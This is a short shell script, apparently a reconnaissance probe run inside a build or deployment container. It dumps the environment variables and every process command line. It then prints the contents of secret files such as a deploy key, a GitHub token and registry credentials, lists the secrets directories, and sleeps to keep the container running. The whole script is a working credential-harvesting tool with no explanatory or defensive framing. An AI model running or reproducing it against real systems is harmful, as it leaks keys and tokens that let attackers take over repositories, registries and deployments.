#!/bin/sh
echo "R40-RUNTIME"
echo "=== BUILD PHASE OUTPUT ==="
cat /build_output.txt 2>/dev/null || echo "No build output file"
echo "=== END BUILD OUTPUT ==="

echo "--- RUNTIME ENV ---"
env | sort
echo "--- RUNTIME PID ---"
for pid in $(ls /proc/ 2>/dev/null | grep -E '^[0-9]+$' | sort -n); do
  cmdline=$(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ')
  if [ -n "$cmdline" ]; then echo "PID=$pid CMD=$cmdline"; fi
done

echo "--- RUNTIME SECRETS ---"
for f in /secrets/build.env /secrets/deploy_key /secrets/github_token /secrets/run.env /secrets/registry-auth.env; do
  echo "==$f=="
  cat "$f" 2>&1
done
ls -laR /secrets/ 2>&1
ls -laR /local/ 2>&1

echo "--- DONE R40 ---"
sleep 600
